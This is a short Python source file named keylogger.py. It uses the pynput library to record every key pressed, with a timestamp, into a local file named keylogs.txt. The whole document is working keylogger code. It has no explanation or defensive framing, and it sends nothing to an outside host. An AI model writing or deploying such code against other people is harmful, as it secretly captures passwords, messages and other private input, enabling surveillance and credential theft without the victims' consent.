# keylogger.py

from pynput import keyboard
from datetime import datetime

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
